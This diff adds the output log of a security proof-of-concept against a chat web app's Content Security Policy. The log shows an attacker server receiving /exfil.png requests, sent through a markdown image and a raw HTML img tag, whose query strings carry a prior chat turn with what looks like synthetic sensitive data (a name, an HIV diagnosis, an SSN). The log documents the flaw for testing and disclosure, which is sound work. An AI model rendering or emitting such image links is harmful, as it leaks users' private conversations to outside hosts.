@@ -1,0 +1,28 @@
+[poc] production CSP from vercel.json:
+  default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; object-src 'none'; worker-src 'self'; style-src 'self'; font-src 'self' data:; img-src 'self' data: blob: https:; connect-src 'self' data: https://*.tinfoil.sh https://plausible.io https://vitals.vercel-insights.com; frame-src 'self' https://verification-center.tinfoil.sh https://webapp-sandbox.tinfoil.sh https://tinfoil-webapp-sandbox-tinfoil.vercel.app; frame-ancestors https://tinfoil.sh https://www.tinfoil.sh; base-uri 'self'; form-action 'self'; upgrade-insecure-requests
+[attacker] received request: /exfil.png?d=prior-turn%3A%20%22My%20name%20is%20Jane%20Roe%2C%20I%20was%20diagnosed%20with%20HIV%20in%202023%2C%20SSN%20123-45-6789%22&via=raw-html-img
+[attacker] received request: /exfil.png?d=prior-turn%3A%20%22My%20name%20is%20Jane%20Roe%2C%20I%20was%20diagnosed%20with%20HIV%20in%202023%2C%20SSN%20123-45-6789%22&via=markdown-image
+[poc] <img> elements in page: [
+  [32m'https://127.0.0.1:48443/exfil.png?d=prior-turn%3A%20%22My%20name%20is%20Jane%20Roe%2C%20I%20was%20diagnosed%20with%20HIV%20in%202023%2C%20SSN%20123-45-6789%22&via=markdown-image'[39m,
+  [32m'https://127.0.0.1:48443/exfil.png?d=prior-turn%3A%20%22My%20name%20is%20Jane%20Roe%2C%20I%20was%20diagnosed%20with%20HIV%20in%202023%2C%20SSN%20123-45-6789%22&via=raw-html-img'[39m
+]
+[poc] CSP violation reports in console: [33m11[39m
+   - Applying inline style violates the following Content Security Policy directive 'style-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256-NoaAisT+c
+   - Applying inline style violates the following Content Security Policy directive 'style-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256-+1BaVBCS9
+   - Applying inline style violates the following Content Security Policy directive 'style-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256-t6WwGh/cC
+   - Applying inline style violates the following Content Security Policy directive 'style-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256-t6WwGh/cC
+   - Applying inline style violates the following Content Security Policy directive 'style-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256-sF6TxAaAb
+   - Applying inline style violates the following Content Security Policy directive 'style-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256-sF6TxAaAb
+   - Applying inline style violates the following Content Security Policy directive 'style-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256-b5Ass7kqN
+   - Applying inline style violates the following Content Security Policy directive 'style-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256-aFiOEyAdi
+   - Executing inline script violates the following Content Security Policy directive 'script-src 'self' 'wasm-unsafe-eval''. Either the 'unsafe-inline' keyword, a h
+   - Loading the stylesheet 'https://127.0.0.1:48443/should-be-blocked-stylesheet' violates the following Content Security Policy directive: "style-src 'self'". Note
+   - Framing 'https://127.0.0.1:48443/' violates the following Content Security Policy directive: "frame-src 'self' https://verification-center.tinfoil.sh https://we
+
+[poc] attacker server hits: [
+  [32m'/exfil.png?d=prior-turn%3A%20%22My%20name%20is%20Jane%20Roe%2C%20I%20was%20diagnosed%20with%20HIV%20in%202023%2C%20SSN%20123-45-6789%22&via=raw-html-img'[39m,
+  [32m'/exfil.png?d=prior-turn%3A%20%22My%20name%20is%20Jane%20Roe%2C%20I%20was%20diagnosed%20with%20HIV%20in%202023%2C%20SSN%20123-45-6789%22&via=markdown-image'[39m
+]
+[poc] RESULT: 2 image request(s) carrying chat data reached the attacker; 0 negative-control request(s) got through (expected 0)
+   leaked: prior-turn: "My name is Jane Roe, I was diagnosed with HIV in 2023, SSN 123-45-6789"
+   leaked: prior-turn: "My name is Jane Roe, I was diagnosed with HIV in 2023, SSN 123-45-6789"
